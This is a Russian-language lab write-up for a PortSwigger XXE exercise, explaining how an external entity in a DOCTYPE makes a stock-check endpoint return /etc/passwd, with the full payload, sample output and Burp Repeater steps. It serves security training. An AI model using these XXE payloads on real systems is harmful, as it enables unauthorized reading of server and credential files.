# Exploiting XXE using external entities to retrieve files

## Theory

<h3>Эксплуатация XXE для извлечения файлов</h3>

Чтобы выполнить атаку с внедрением XXE, которая извлекает произвольный файл из файловой системы сервера, вам необходимо изменить отправленный XML двумя действиями:

* Введите (или отредактируйте) элемент DOCTYPE, определяющий внешний объект, содержащий путь к файлу.
* Отредактируйте значение данных в XML, которое возвращается в ответе приложения, чтобы использовать определенный внешний объект.

Например, предположим, что приложение для покупок проверяет наличие товара на складе, отправляя на сервер следующий XML-код:
```
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck><productId>381</productId></stockCheck>
```

Приложение не обеспечивает особой защиты от атак XXE, поэтому вы можете использовать уязвимость XXE для получения файла /etc/passwd, отправив следующую полезную нагрузку XXE:
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```

Эта полезная нагрузка XXE определяет внешний объект &xxe; значение которого является содержимым файла /etc/passwd и использует сущность в значении productId. Это приводит к тому, что ответ приложения включает содержимое файла:
```
Invalid product ID: root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...
```

## Writeup

Главная страница:

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/XXE_injection/Exploiting_XXE_using_external_entities_to_retrieve_files/assets/1.png)

Выберем любой продукт.

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/XXE_injection/Exploiting_XXE_using_external_entities_to_retrieve_files/assets/2.png)

Перейдем на его страницу и спустимся в самый низ.

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/XXE_injection/Exploiting_XXE_using_external_entities_to_retrieve_files/assets/3.png)

Нажмем на кнопку "Check stock" и перехватим запрос. Отправляем его в Repeater.

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/XXE_injection/Exploiting_XXE_using_external_entities_to_retrieve_files/assets/4.png)

Модифицируем запрос. Код экплоита:
```
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
```

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/XXE_injection/Exploiting_XXE_using_external_entities_to_retrieve_files/assets/5.png)

Получаем ответ от сервера.

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/XXE_injection/Exploiting_XXE_using_external_entities_to_retrieve_files/assets/6.png)
